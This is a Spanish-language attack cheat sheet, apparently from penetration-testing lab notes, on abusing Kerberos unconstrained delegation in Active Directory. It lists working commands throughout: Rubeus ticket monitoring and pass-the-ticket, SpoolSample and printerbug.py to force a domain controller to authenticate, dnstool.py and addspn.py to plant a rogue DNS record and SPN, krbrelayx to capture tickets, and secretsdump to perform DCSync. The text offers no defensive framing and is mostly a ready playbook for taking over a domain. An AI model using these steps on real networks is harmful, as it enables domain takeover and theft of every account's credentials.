# Sobre computadoras

## Esperando la autenticación de un usuario privilegiado

Si logramos comprometer un servidor que tiene habilitada la Unconstrained delegation, y posteriormente un administrador de dominio inicia sesión, podremos extraer su TGT y usarlo para movernos lateralmente y comprometer otras máquinas, incluidos los controladores de dominio.

Rubeus es la herramienta ideal para este ataque. Como administrador local, Rubeus puede ejecutarse para supervisar los tickets almacenados. Si se encuentra un TGT en un ticket TGS, Rubeus nos lo mostrará.

### 1)Monitoreo de tickets
Ponemos a Rubeus en modo monitoreo esperando que los usuarios se conecten al servidor.

    .\Rubeus.exe monitor /interval:5 /nowrap

### 2) Usamos el ticket para pediro otro ticket con otro servicio


    .\Rubeus.exe asktgs /ticket:<ticket> /service:<servicio>/dc01.INLANEFREIGHT.local /ptt

Si esto no funciona:

    .\Rubeus.exe renew /ticket:<ticket> /ptt

Ahora podemos aprovechar este ticket para realizar acciones en el dc01 como el usuario privilegiado.

## Aprovechando el error de impresora


Es muy similar a la anterior, simplemente que aprovechamos una falla en el MS-RPRN (Print system remote protocol) que puede obligar a un servidor a autenticarse frente a otro


Para esto utilizaremos la herramienta: **SpoolSample**:

    https://github.com/leechristensen/SpoolSample

### 1) Ponemos el rubeus en modo monitor:

    .\Rubeus.exe monitor /interval:5 /nowrap

### 2) Corremos SpoolSample

    .\SpoolSample.exe <target> <our_server>

### 3) Conseguimos el ticket y continuamos con el ataque anterior.

Si el ticket es del DC, una vez importado, lo renovamos y con mimikatz podemos realizar un DCSync ;)



# Sobre los usuarios

En el caso de los usuarios, necesitaremos tener control del user y permisos de **GenericWrite**, **WriteSPN** o **WriteProperty** sobre el atributo **ServicePrincipalName**.

El ataque consiste en crear un servicio a nombre del usuario con Unconstrained Delegations para que este herede dichos privilegios, de esta manera, los usuarios o computadoras que  se conecnten a este servicio entregarán su ticket.

### 1) Creamos un DNS Falso

En la máquina atacante creamos un DNS falso:

    python dnstool.py -u dominio\\usuario -p contraseña -r roguecomputer.inlanefreight.local -d 10.10.14.2 --action add 10.129.1.207
### Agregamos un SPN falso al usuario vulnerable para que comparta un servicio en el DNS falso

De esta manera el servicio heredará sus privilegios de delegación

    python addspn.py -u dominio\\usuario -p contraseña --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local dc01.inlanefreight.local

### 3) Ponemos a capturar los tickets

    sudo python krbrelayx.py -hashes :<hash_de_sqldev>

### 4) Forzamos al DC o a otro user a autenticarse contra el DNS falso

    python3 printerbug.py dominio/usuario:contraseña@IP_DC roguecomputer.inlanefreight.local
### 5) Con el ticket del DC hacemos DCSync

    export KRB5CCNAME=DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
    secretsdump.py -k -no-pass dominio/DC01$
